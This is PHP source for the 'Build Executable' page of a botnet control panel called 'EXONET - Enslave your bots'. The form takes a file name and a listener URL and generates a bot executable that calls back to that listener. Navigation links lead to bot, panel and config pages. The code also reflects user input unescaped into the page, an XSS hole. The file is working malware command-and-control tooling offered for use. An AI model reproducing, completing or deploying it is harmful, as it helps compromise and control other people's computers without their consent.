<?php
session_start();
require_once('classes/class.bots.php');
require_once('classes/class.users.php');
require_once('classes/class.build.php');

$Users = new Users();
$checkBots = new checkBots();
$checkBots->checkSession();

//Add user into DB

$check;
$mes;
$div;

if(isset($_POST['build_ex']))
{
	if(($_POST['url'] != "") && ($_POST['name'] != ""))
	{

		$build = new Build();
		$div = $build->createExe($_POST['url'],$_POST['name']);
	}
		
			else (($mes = "No listener URL/File name specified.") && ($div = '<div class="alert alert-error">
	  <button type="button" class="close" data-dismiss="modal"></button>
	  <h4>Warning!</h4>
	  '.$mes.'
	</div>'));
	
}

?>
<!DOCTYPE HTML>
<html>
<head>
	<title>EXONET - Enslave your bots</title>
	<link type="text/css" rel="stylesheet" href="css/bootstrap.css" /> 
	<style>
	
		.input-prepend input
		{
			margin-bottom:10px;
		}
	
		legend {
			border-bottom:3px solid;
		}
		
		.container > .content {
			padding-left:15px;
			padding-top:10px;
			background-color: #eee;
			height:auto;
			border-radius:10px;
			      -webkit-border-radius: 10px 10px 10px 10px;
           -moz-border-radius: 10px 10px 10px 10px;
                border-radius: 10px 10px 10px 10px;
			-webkit-box-shadow: 0 1px 2px rgba(0,0,0,.15);
           -moz-box-shadow: 0 1px 2px rgba(0,0,0,.15);
                box-shadow: 0 1px 2px rgba(0,0,0,.15);
		}
	
		ul {
			padding-top:20px;
			padding-left:100px;
		}
		
		
		
	</style>
</head>
<body>
	<ul class="nav nav-tabs">
		<?php 
			echo '<li><a href="bots.php">Bots</a></li>';
if(isset($_SESSION['admin']))
	{
		echo '<li><a href="panel.php">Panel</a></li>';
	}
echo '<li><a href="config.php">Config</a></li>
		<li class="active"><a href="build.php">Build</a></li>
		<li><a href="logout.php">Logout</a></li>';
		?>
	</ul>
<div class="container">	
<?php echo $div;?>
	<div class="content">
		<h3>Build Executable</h3>
		<fieldset>
			<form action="" method="POST" class="well span5">
			<legend>Executable settings</legend>
				<div class="input-prepend">
					<span class="add-on"><i class="icon-user"></i></span>
					<input id="prependedInput" value="<?php echo isset($_POST['name']) ? $_POST['name'] : ""; ?>" name="name"type="text" placeholder="File Name"><br/>
					</div>
				<div class="input-prepend">
					<span class="add-on"><i class="icon-user"></i></span>
					<input id="prependedInput" name="url"type="text" value="http://www.example.nl/listener.php"><br/>
					<button name="build_ex" class="btn">Build</button>
					</div>
			</form>
	  </fieldset>	
</div>	
</body>
</html>